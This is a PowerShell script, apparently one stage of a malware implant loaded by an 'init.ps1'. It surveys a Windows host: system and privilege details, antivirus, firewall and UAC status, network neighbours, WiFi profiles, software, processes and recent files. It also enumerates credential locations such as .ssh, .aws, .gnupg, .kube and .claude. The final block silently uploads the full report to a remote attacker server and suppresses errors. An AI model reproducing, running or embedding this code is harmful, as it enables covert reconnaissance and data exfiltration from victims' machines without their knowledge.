# inherits $H, $P, $AU from init.ps1

$out = [System.Text.StringBuilder]::new()
function Add($section, $data) {
    $out.AppendLine("") | Out-Null
    $out.AppendLine("[$section]") | Out-Null
    $out.AppendLine($data) | Out-Null
}

# ── System ────────────────────────────────────────────────
$os  = Get-WmiObject Win32_OperatingSystem
$cs  = Get-WmiObject Win32_ComputerSystem
$cpu = (Get-WmiObject Win32_Processor | Select-Object -First 1).Name
$ram = [math]::Round($cs.TotalPhysicalMemory/1GB, 2)
$disk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" |
        ForEach-Object { "$($_.DeviceID) $([math]::Round($_.FreeSpace/1GB,1))GB free / $([math]::Round($_.Size/1GB,1))GB" }

Add "SYSTEM" @"
Hostname   : $env:COMPUTERNAME
Username   : $env:USERNAME
Domain     : $($cs.Domain)
OS         : $($os.Caption) $($os.OSArchitecture)
Build      : $($os.BuildNumber)
CPU        : $cpu
RAM        : $ram GB
Disk       : $($disk -join ' | ')
Uptime     : $((Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime))
"@

# ── Privileges ───────────────────────────────────────────
$id      = [Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = ([Security.Principal.WindowsPrincipal]$id).IsInRole('Administrator')
$groups  = $id.Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value } | Select-Object -First 5

Add "PRIVILEGES" @"
Is Admin   : $isAdmin
User SID   : $($id.User)
Groups     : $($groups -join ', ')
"@

# ── Security ─────────────────────────────────────────────
$av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct 2>$null |
      ForEach-Object { $_.displayName }
$fw = (Get-NetFirewallProfile | ForEach-Object { "$($_.Name):$($_.Enabled)" }) -join ' | '
$mp = try { (Get-MpComputerStatus).RealTimeProtectionEnabled } catch { "N/A" }
$uac = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA

Add "SECURITY" @"
Antivirus  : $($av -join ', ')
Firewall   : $fw
Defender RT: $mp
UAC        : $uac
"@

# ── Network ──────────────────────────────────────────────
$ips = Get-NetIPAddress -AddressFamily IPv4 |
       Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } |
       ForEach-Object { "$($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)" }
$gw  = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop
$dns = (Get-DnsClientServerAddress -AddressFamily IPv4 |
        Where-Object { $_.ServerAddresses } |
        Select-Object -First 1).ServerAddresses

Add "NETWORK" @"
Interfaces : $($ips -join ' | ')
Gateway    : $gw
DNS        : $($dns -join ', ')
"@

# ── ARP (nearby hosts) ───────────────────────────────────
$arp = arp -a 2>$null | Select-String "dynamic" | ForEach-Object { $_.Line.Trim() }
Add "ARP (nearby)" ($arp -join "`n")

# ── Active Connections ───────────────────────────────────
$conns = Get-NetTCPConnection -State Established 2>$null |
         ForEach-Object { "$($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)" } |
         Select-Object -First 10
Add "CONNECTIONS" ($conns -join "`n")

# ── WiFi Profiles ────────────────────────────────────────
$wifi = netsh wlan show profiles 2>$null | Select-String "All User Profile" |
        ForEach-Object { ($_ -split ":")[1].Trim() }
Add "WIFI PROFILES" ($wifi -join "`n")

# ── Installed Software (recent/interesting) ──────────────
$sw = Get-WmiObject Win32_Product 2>$null |
      Sort-Object InstallDate -Descending |
      Select-Object -First 15 |
      ForEach-Object { "$($_.Name) $($_.Version)" }
Add "SOFTWARE (top 15)" ($sw -join "`n")

# ── Running Processes (non-system) ───────────────────────
$procs = Get-Process |
         Where-Object { $_.Company -and $_.Company -notmatch "Microsoft" } |
         Select-Object -First 15 |
         ForEach-Object { "$($_.Name) (PID:$($_.Id)) - $($_.Company)" }
Add "PROCESSES" ($procs -join "`n")

# ── Scheduled Tasks (non-Microsoft) ──────────────────────
$tasks = Get-ScheduledTask 2>$null |
         Where-Object { $_.TaskPath -notmatch "\\Microsoft\\" -and $_.State -eq "Ready" } |
         Select-Object -First 10 |
         ForEach-Object { "$($_.TaskName) -> $($_.TaskPath)" }
Add "SCHEDULED TASKS" ($tasks -join "`n")

# ── Recent Files ─────────────────────────────────────────
$recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
          Sort-Object LastWriteTime -Descending |
          Select-Object -First 10 |
          ForEach-Object { $_.Name }
Add "RECENT FILES" ($recent -join "`n")

# ── Hidden dotfiles in home directory ────────────────────
$home = $env:USERPROFILE

# files/folders starting with . (like .ssh, .aws, .claude, .config)
$dotfiles = Get-ChildItem $home -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like ".*" } |
            ForEach-Object {
                $type = if ($_.PSIsContainer) { "dir" } else { "file" }
                "[$type] $($_.Name)"
            }

# files with Hidden attribute that don't start with .
$hiddenfiles = Get-ChildItem $home -Force -ErrorAction SilentlyContinue |
               Where-Object { $_.Attributes -match "Hidden" -and $_.Name -notlike ".*" } |
               ForEach-Object {
                   $type = if ($_.PSIsContainer) { "dir" } else { "file" }
                   "[hidden $type] $($_.Name)"
               }

# peek inside interesting dotdirs for known sensitive files
$interesting = @(".ssh", ".aws", ".config", ".claude", ".git", ".gnupg", ".kube")
$peeked = foreach ($d in $interesting) {
    $dp = Join-Path $home $d
    if (Test-Path $dp) {
        $items = Get-ChildItem $dp -Force -ErrorAction SilentlyContinue |
                 Select-Object -First 10 |
                 ForEach-Object { "  $d/$($_.Name)" }
        $items
    }
}

$dotout = ($dotfiles + $hiddenfiles) -join "`n"
if ($peeked) { $dotout += "`n`n[contents of interesting dirs]`n" + ($peeked -join "`n") }

Add "HIDDEN/DOTFILES (~)" $dotout

# ── POST silently (no terminal print, saved as date_hash_recon.txt) ──
$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
try { $wc.UploadString("https://${H}:${P}/store/recon", $out.ToString()) } catch {}
